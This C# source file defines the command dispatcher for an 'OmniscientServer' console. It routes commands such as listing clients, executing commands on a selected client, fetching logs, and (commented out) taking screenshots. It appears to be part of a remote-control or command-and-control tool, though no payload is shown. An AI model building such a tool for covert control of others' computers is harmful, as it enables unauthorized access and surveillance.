namespace OmniscientServer
{
    public class HandleCommand
    {
        private Server server;
        private Dictionary<string, Command> commands;

        public HandleCommand(Server server)
        {
            this.server = server;
            commands = new Dictionary<string, Command>
            {
                { "help", new HelpCommand(server) },
                { "list", new ListClientCommand(server) },
                { "use", new UseClientCommand(server) },
                { "exec", new ExecuteOnClientCommand(server) },
                // { "nir", new ExecuteNirOnClientCommand(server) },
                { "close", new CloseCommand(server) },
                { "exit", new ExitCommand(server) },
                { "get-log", new GetLogCommand(server) },
                // { "screenshot", new ScreenshotCommand(server) },
                { "sad", new SadCommand(server) },
            };
        }

        public void Execute(string command)
        {
            string[] commandParts = command.Split(' ');
            string action = commandParts[0].ToLower();

            if (commands.ContainsKey(action))
            {
                string result = commands[action].Execute(commandParts);
                if (result != "") {
                    Console.WriteLine(result);
                }
            }
            else
            {
                Console.WriteLine("Omniscient$ Invalid command.");
            }
        }
    }

}